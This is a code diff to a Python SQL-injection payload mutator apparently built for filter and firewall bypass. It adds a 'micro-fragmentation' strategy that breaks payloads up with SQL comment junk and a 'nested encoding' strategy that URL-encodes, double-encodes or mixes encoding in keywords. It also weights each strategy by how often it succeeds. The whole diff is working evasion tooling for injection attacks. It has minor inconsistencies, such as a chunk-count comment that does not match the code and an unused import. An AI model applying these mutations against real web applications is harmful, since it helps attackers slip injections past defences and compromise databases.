@@ -11,7 +11,9 @@ class ASTMutator:
             "union_balance": self._balance_union_columns,
             "junk_fill": self._junk_filling,
             "context_aware": self._context_aware_mutation,
-            "directed_bypass": self._directed_keyword_mutation
+            "directed_bypass": self._directed_keyword_mutation,
+            "micro_fragmentation": self._micro_fragmentation,
+            "nested_encoding": self._nested_encoding
         }
         # Awareness: Track success of each strategy
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -208,4 +210,59 @@ class ASTMutator:
             sep = random.choice(separators)
             mutated = mutated.replace(" ", sep)
 
+        return mutated
+
+    def _micro_fragmentation(self, payload):
+        """Micro-Fragmentation: Splits the payload into small chunks stuffed with junk data."""
+        if len(payload) < 5: return payload
+        
+        # Split into 3-5 random chunks
+        num_chunks = random.randint(3, 6)
+        chunk_size = max(1, len(payload) // num_chunks)
+        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
+        
+        junk_patterns = [
+            "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
+            "/*!*/", "/**/--/**/", " "
+        ]
+        
+        fragmented = ""
+        for i, chunk in enumerate(chunks):
+            fragmented += chunk
+            if i < len(chunks) - 1:
+                fragmented += random.choice(junk_patterns)
+        
+        return fragmented
+
+    def _nested_encoding(self, payload):
+        """Nested Encoding: Applies layers of encoding (URL, Hex, etc.) to parts of the payload."""
+        import base64
+        
+        def to_hex(s):
+            return "".join([f"0x{ord(c):02x}" for c in s])
+            
+        def to_url(s):
+            return "".join([f"%{ord(c):02x}" for c in s])
+
+        # Only encode keywords or specific parts to avoid breaking SQL syntax entirely
+        mutated = payload
+        for kw in self.sql_keywords:
+            if kw in mutated.upper() and random.random() < 0.4:
+                # Pick a random encoding strategy
+                enc_type = random.choice(["hex", "url", "double_url", "mixed"])
+                
+                if enc_type == "hex" and kw in ["SELECT", "UNION"]:
+                    # Hex is risky for keywords, maybe just for strings? 
+                    # Let's keep it simple for now
+                    continue 
+                
+                if enc_type == "url":
+                    mutated = re.sub(rf'\b{kw}\b', to_url(kw), mutated, flags=re.IGNORECASE)
+                elif enc_type == "double_url":
+                    mutated = re.sub(rf'\b{kw}\b', to_url(to_url(kw)), mutated, flags=re.IGNORECASE)
+                elif enc_type == "mixed":
+                    # Partial URL encoding
+                    encoded_kw = "".join([to_url(c) if random.random() < 0.5 else c for c in kw])
+                    mutated = re.sub(rf'\b{kw}\b', encoded_kw, mutated, flags=re.IGNORECASE)
+                    
         return mutated
